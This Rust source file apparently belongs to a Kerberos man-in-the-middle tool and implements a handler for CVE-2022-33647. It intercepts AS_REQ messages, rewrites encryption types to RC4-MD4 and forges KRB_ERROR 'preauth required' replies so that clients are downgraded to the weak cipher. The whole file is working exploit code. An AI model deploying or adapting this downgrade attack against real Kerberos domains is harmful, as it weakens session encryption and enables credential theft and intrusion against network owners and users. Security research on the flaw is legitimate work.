use kile::{
    constants::ETYPE_RC4_MD4,
    structures::{AsReqExt, KrbErrorExt},
    KdcFrame,
};
use rasn_kerberos::KrbError;
use tracing::info;

use super::{Handler, HandlerAction};

/// Handler that attempts to downgrade TGT session to RC4-MD4 cipher per CVE-2022-33647
#[derive(Clone, Copy)]
pub struct Cve202233647Handler;

impl Cve202233647Handler {
    pub fn new() -> Self {
        Self {}
    }
}

impl Handler for Cve202233647Handler {
    fn name(&self) -> &'static str {
        "CVE-2022-33647"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        //let etype = self.etype;
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                //Some(etype) if etype == ETYPE_RC4_MD4 => {
                Some(ETYPE_RC4_MD4) => {
                    info!("Received AS_REQ with RC4-MD4 preauth, modifying body ETYPEs and forwarding to KDC...");
                    let as_req = as_req.clone().replace_etypes(ETYPE_RC4_MD4);
                    HandlerAction::Forward(KdcFrame::AsReq(as_req))
                }
                Some(_) => {
                    info!("Received AS_REQ with unwanted preauth etype, forging KRB_ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, ETYPE_RC4_MD4);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
                None => {
                    info!("Received AS_REQ without preauth, forging KRB_ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, ETYPE_RC4_MD4);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
            },
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        HandlerAction::Forward(frame)
    }
}
